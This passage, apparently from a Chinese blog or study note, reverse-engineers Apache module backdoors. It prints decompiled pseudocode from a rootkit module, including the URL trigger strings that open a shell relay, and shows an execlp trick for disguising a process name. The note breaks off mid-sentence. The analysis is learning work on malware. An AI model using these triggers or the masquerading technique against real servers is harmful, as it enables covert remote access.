# 基础知识

以sub开头加地址的是没有函数表也不是debug的

# 先分析一个简单的
地址：[Apache-HTTP-Server-Module-Backdoor](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor)

**注意centos这类系统安装的是httpd-devel，不是apache2-dev，然后记得重启服务**


> 这个是使用了一个popen的函数执行了系统命令，配合源码，感觉比较容易看懂

![title](https://i.loli.net/2019/05/14/5cda26a7ac7a028583.png)


# 再来分析这个

首先，根据上面的思路，发现没有白底加粗的自定义的函数，，，，然后找到一个_init_proc初始化的一个函数,直接F5（目前还就会这一个操做）
```
void (*init_proc())(void)
{
  start();
  sub_1010();
  return sub_2280();
}
```
start()应该就是类似初始化的一些操做。和上一个对比了一下，发现并没有什么异常接下来查看sub_1010代码如下
```
signed __int64 __fastcall sub_2101(__int64 a1)
{
  int v2; // [rsp+14h] [rbp-Ch]
  __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = ap_get_module_config(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 104LL), (__int64)&core_module);
  if ( v3 )
    v2 = *(_DWORD *)(v3 + 8);
  if ( *(_QWORD *)(a1 + 352) && !strcmp(*(const char **)(a1 + 352), "hackinglabwelcomeyou!")
    || *(_QWORD *)(a1 + 384) && !strcmp(*(const char **)(a1 + 384), "hackinglabwelcomeyou!") )
  {
    process_client(256, v2);
  }
  if ( *(_QWORD *)(a1 + 352) && !strcmp(*(const char **)(a1 + 352), "wearefriends+")
    || *(_QWORD *)(a1 + 384) && !strcmp(*(const char **)(a1 + 384), "wearefriends+") )
  {
    process_client(512, v2);
  }
  return 0xFFFFFFFFLL;
}
```
先读取了一个配置文件（后来我查了一下ap_get_module_config，应该是还可以读取url的一些信息），然后根据这个信息得到v2然后做了两个字符串的比较分别执行了process_client(256, v2)和process_client(512, v2)
```
void __fastcall __noreturn process_client(int a1, int a2)
{
  unsigned int v2; // edx
  int v3; // eax
  unsigned int v4; // edx
  ssize_t v5; // rax
  ssize_t v6; // rax
  char s1; // [rsp+10h] [rbp-10A0h]
  fd_set readfds; // [rsp+1010h] [rbp-A0h]
  int buf; // [rsp+1090h] [rbp-20h]
  int v10; // [rsp+1094h] [rbp-1Ch]
  int v11; // [rsp+1098h] [rbp-18h]
  int v12; // [rsp+109Ch] [rbp-14h]

  buf = a1;
  v10 = write(pipe_A[1], &buf, 4uLL);
  if ( v10 != 4 )
    exit(0);
  v10 = read(pipe_B[0], &buf, 4uLL);
  if ( v10 != 4 )
    exit(0);
  if ( buf == 16 )
    exit(0);
  while ( 1 )
  {
    memset(&readfds, 0, sizeof(readfds));
    v11 = 0;
    v12 = (unsigned __int64)&buf;
    v2 = (unsigned int)(pipe_B[2 * buf] >> 31) >> 26;
    readfds.fds_bits[pipe_B[2 * buf] / 64] |= 1LL << (((v2 + pipe_B[2 * buf]) & 0x3F) - v2);
    readfds.fds_bits[a2 / 64] |= 1LL << a2 % 64;
    v3 = a2;
    if ( pipe_B[2 * buf] >= a2 )
      v3 = pipe_B[2 * buf];
    v10 = v3;
    if ( select(v3 + 1, &readfds, 0LL, 0LL, 0LL) < 0 )
      exit(0);
    v4 = (unsigned int)(pipe_B[2 * buf] >> 31) >> 26;
    if ( !((readfds.fds_bits[pipe_B[2 * buf] / 64] >> (((v4 + pipe_B[2 * buf]) & 0x3F) - v4)) & 1) )
      goto LABEL_24;
    v10 = read(pipe_B[2 * buf], &s1, 0x1000uLL);
    if ( v10 > 0 )
    {
      if ( !strncmp(&s1, &s2, 4uLL) )
      {
        shutdown(a2, 2);
        exit(0);
      }
      v5 = send(a2, &s1, v10, 0);
      if ( v5 == v10 )
      {
LABEL_24:
        if ( !((readfds.fds_bits[a2 / 64] >> a2 % 64) & 1) )
          continue;
        v10 = recv(a2, &s1, 0x1000uLL, 0);
        if ( v10 > 0 )
        {
          v6 = write(pipe_A[2LL * buf + 1], &s1, v10);
          if ( v6 == v10 )
            continue;
        }
      }
    }
    shutdown(a2, 2);
    write(pipe_A[1], &buf, 4uLL);
    exit(0);
  }
}
```
> 这个就没有之前那么简单了，好像看一眼源码啊

综合一下上面的分析尝试访问下面两个url
```
view-source:http://192.168.72.137/?wearefriends+
回显rootme-0.3 ready，说明的确是这样用的

http://192.168.72.137/?hackinglabwelcomeyou!
无线连接，感觉有点像反弹shell时候的状态，而且上面的的函数命名为process_client有点可能是弹shell吧，那就是正向连接和反弹shell，正向连接的话防火墙并没有开放其他端口，反弹的话程序中也没有IP字段
```

> 感觉这里就遇到了瓶颈，对这个linux的动态链接库so还是了解的太少了，后来有对照着看了一下mod_version.so也没对比出东西来



# 一些其他的事
放一些前面过程查询到的一些资料连接

apache动态链接库函数的一些说明
- [关于ap_get_module_config的一个问题](https://grokbase.com/t/apache/modules-dev/06amwtemvp/question-about-ap-get-module-config) 就是这个问题让我发现这个有可能是是根据url上提交参数的方式执行的
- [apache动态链接库里面的函数官方说明](https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__CONFIG.html)

关于动态链接库的一些基础知识
- [解析如何在C语言中调用shell命令的实现方法](https://www.cnblogs.com/sky-heaven/p/4687489.html)讲了三个system()、popen()、vfork(),应该不太全，至少还有exec系列的函数
- [C/C++ 静态链接库(.a) 与 动态链接库(.so)](http://www.cnblogs.com/52php/p/5681711.html)说了一下动态链接库的基础知识
- [Linux动态链接库.so文件的命名及用途总结](http://blog.sina.com.cn/s/blog_3ee731bc0102xx9n.html),里面提到一个有意思的命令ldd +可执行程序 可以查看这个程序加载了那些动态链接库（要是面试ali的时候知道这个就好了）


然后还学到了一个新的命令
```
# linux终端下比较两个文件
diff -u file1 file2	#快速
vimdiff file1 file2	#直观
```

# 再回来刚这个
随便在翻一翻发现有一些地方一直在试图执行/usr/sbin/apache2 -k start这个命令，但是因为是centos，并没有apache2这个文件，正确的文件应该是httpd，然后ps aux 发现进程中也存在这个，仔细看了一下，这是一个exec系列的函数！！！
![title](https://i.loli.net/2019/05/14/5cda9d351319869939.png)

尝试写一个
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
//函数原型：int execlp(const char *file, const char *arg, ...);
int main(void)
{
     printf("before execlp****\n");
     if(execlp("ps","/usr/sbin/apache3","-l",NULL) == -1)
     {
         printf("execlp failed!\n");
     }
     printf("after execlp*****\n");
     return 0;
}
```

编译后执行`./a.out & ps aux` 发现真的有进程COMMAND为`/usr/sbin/apache3`的进程，但是从输出上看并不是单纯的`ps aux`命令，还掺杂着`ps -l`的结果。hhhhh

那么问题来了rootkit里面的s是那里来的，在一个叫`runshell_pty`的函数里面（名字这么奇怪为什么没早点关注），在另一个叫`runshell_raw`里面还有一个类似的但是参数是`&file`
但是好像并不能跟踪到这个函数是
